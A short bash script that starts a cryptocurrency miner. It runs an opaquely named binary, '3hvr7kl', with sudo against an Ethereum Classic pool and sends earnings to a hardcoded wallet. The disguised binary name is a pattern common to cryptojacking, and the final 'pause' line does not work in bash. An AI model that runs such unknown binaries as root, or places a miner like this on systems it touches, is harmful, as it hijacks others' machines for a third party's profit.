#!/bin/bash

POOL=asia-etc.2miners.com:1010
WALLET=0xe3ed79913abb464e0ca11c278cec2a501bd4da7d
WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)

cd "$(dirname "$0")"

chmod +x ./3hvr7kl && sudo ./3hvr7kl -a etchash -o $POOL -u $WALLET.$WORKER -log
pause $@
